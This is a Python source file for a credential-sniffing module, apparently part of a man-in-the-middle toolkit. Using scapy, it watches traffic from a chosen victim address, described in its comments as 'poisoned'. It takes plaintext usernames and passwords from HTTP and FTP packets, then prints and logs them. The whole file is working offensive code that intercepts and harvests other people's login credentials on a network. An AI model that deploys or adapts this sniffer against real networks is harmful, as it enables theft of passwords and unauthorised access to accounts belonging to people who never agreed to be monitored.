import stream
import util
from sniffer import Sniffer
from re import findall
from scapy.all import *
from threading import Thread

#
# Module sniffs poisoned traffic for passwords, essentially just parsing payloads for the USERNAME or PASSWORD
# flag. 
#
class PasswordSniffer(Sniffer):
	def __init__(self):
		super(PasswordSniffer, self).__init__('Password sniffer')

	#
	# The only applied filter for the sniffer is the source address; the rest is fair game for parsing
	#
	def traffic_sniffer(self):
		sniff(filter="src %s"%self.source, store=0,prn=self.dump, stopper=self.stop_callback, stopperTimeout=3)

	#
	# initialize the sniffer
	#
	def initialize(self):
		self.source = raw_input('[!] Enter address to sniff passwords from: ')
		tmp = raw_input('[!] Sniff passwords from %s.  Is this correct? '%self.source)
		if 'n' in tmp.lower():
			return None
		self.sniff = True
		sniff_thread = Thread(target=self.traffic_sniffer)
		sniff_thread.start()
		return self.source

	#
	# Parse packet payloads for username/passwords
	#
	def dump(self, pkt):
		if not pkt is None:
			# http
			if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 80 and pkt.haslayer(Raw):
				payload = pkt.getlayer(Raw).load
				if 'username' in payload or 'password' in payload and self.dump_data:
					print payload
				if self.log_data:
					self.log_file.write(str(payload))
			# ftp
			elif pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 21:
				payload = str(pkt.sprintf("%Raw.load%"))
				# strip control characters
				payload = payload[:-5] 
				prnt = None
				if 'USER' in payload:
					prnt = "Host: %s\n[!] User: %s "%(pkt[IP].dst,findall("(?i)USER (.*)", payload)[0])
				elif 'PASS' in payload:
					prnt = 'Pass: %s'%findall("(?i)PASS (.*)", payload)[0]
				if not prnt is None and self.dump_data: 
					util.Msg(prnt)
				if self.log_data and not prnt is None: 
					self.log_file.write(prnt)
			# TODO: other protos....
